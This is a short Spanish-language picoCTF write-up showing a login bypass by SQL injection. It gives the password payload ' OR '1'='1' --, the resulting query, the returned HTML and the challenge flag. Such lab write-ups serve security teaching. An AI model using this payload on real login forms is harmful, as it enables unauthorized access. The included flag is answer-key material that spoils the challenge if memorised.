### Descripción
Can you login to this website?Try to login [here](http://saturn.picoctf.net:65103/).
### Solución
### Solución 1 - inyeccion
```
entramos y nos hacemos login con cualquier clave, pero falla intentamos con admin y tambien, asi que usamos una inyeccion
username: admin
password: ' OR '1'='1' --
SQL query: SELECT * FROM users WHERE name='admin' AND password='' OR '1'='1' --'

# Logged in! But can you see the flag, it is in plainsight.
logramos ingresar, luego inspeccionamos y listo

|   |
|---|
|<pre>username: admin|
|password: &#039; OR &#039;1&#039;=&#039;1&#039; --|
|SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; AND password=&#039;&#039; OR &#039;1&#039;=&#039;1&#039; --&#039;|
|</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}</p>|
```
### Notas adicionales 
picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}
### Referencias